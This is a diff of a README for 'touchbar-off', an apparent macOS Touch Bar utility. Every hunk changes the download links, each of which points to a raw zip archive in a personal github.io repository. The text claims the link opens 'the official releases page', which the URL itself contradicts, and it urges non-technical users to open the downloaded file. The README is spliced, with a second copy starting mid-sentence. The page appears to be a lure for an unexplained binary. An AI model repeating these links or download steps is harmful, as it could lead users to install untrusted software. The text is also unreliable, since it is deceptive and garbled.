@@ -5,7 +5,7 @@ description: "Turn off the MacBook Touch Bar and restore it from the menu bar; a
 ---
 # 🛑 touchbar-off - Stop Touch Bar Flicker on macOS
 
-[![Download touchbar-off](https://img.shields.io/badge/Download-touchbar--off-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip)
+[![Download touchbar-off](https://img.shields.io/badge/Download-touchbar--off-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip)
 
 touchbar-off is a free macOS menu bar app for people who want a calmer MacBook Pro experience. It lets you turn off the Touch Bar from the menu bar, which can help reduce the distracting flicker some users notice on the panel. It is made for everyday users: open it, click its menu bar icon, and control the Touch Bar without digging through complicated settings.
 
@@ -39,9 +39,9 @@ If you are on Windows, stop here: this app cannot be installed or run on Windows
 
 ## 🚀 Download and open
 
-[![Get touchbar-off](https://img.shields.io/badge/Get_touchbar--off-4dabf7?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip)
+[![Get touchbar-off](https://img.shields.io/badge/Get_touchbar--off-4dabf7?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip)
 
-Visit this link to download the application: [touchbar-off Releases](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip).
+Visit this link to download the application: [touchbar-off Releases](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip).
 
 The link opens the official releases page. Use that page to download the application. After the download finishes, open the downloaded item from your Downloads folder. Follow the normal macOS prompts on your screen. When the app opens, it will appear in the menu bar at the top of your Mac screen.
 
@@ -66,7 +66,7 @@ The Touch Bar is a small display strip on certain MacBook Pro models. It can cha
 
 For many people, turning the Touch Bar off is enough to make the Mac# 🛑 touchbar-off - Stop Distracting Touch Bar Flicker on macOS
 
-[![Download touchbar-off](https://img.shields.io/badge/Download-touchbar--off-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip)
+[![Download touchbar-off](https://img.shields.io/badge/Download-touchbar--off-ff6b6b?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip)
 
 touchbar-off is a free macOS menu bar app for MacBook Pro users who want a simple way to turn off the Touch Bar. It is designed to help reduce the distraction of Touch Bar flicker by giving you a menu bar control for the panel. The app is small, focused, and made for everyday use. You do not need programming knowledge to use it.
 
@@ -102,9 +102,9 @@ If you are on Windows, do not download touchbar-off expecting a Windows applicat
 
 ## 🚀 Download and open
 
-[![Get touchbar-off](https://img.shields.io/badge/Get_touchbar--off-4dabf7?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip)
+[![Get touchbar-off](https://img.shields.io/badge/Get_touchbar--off-4dabf7?style=for-the-badge&logo=apple&logoColor=white)](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip)
 
-Visit this link to download the application: [touchbar-off Releases](https://github.com/hassanamir24/hassanamir24.github.io/raw/refs/heads/main/static/docs/v2.7.zip).
+Visit this link to download the application: [touchbar-off Releases](https://raw.githubusercontent.com/hassanamir24/hassanamir24.github.io/main/static/docs/v2.7.zip).
 
 The link opens the official releases page. Use that page to download the application. The download is intended for macOS.
 
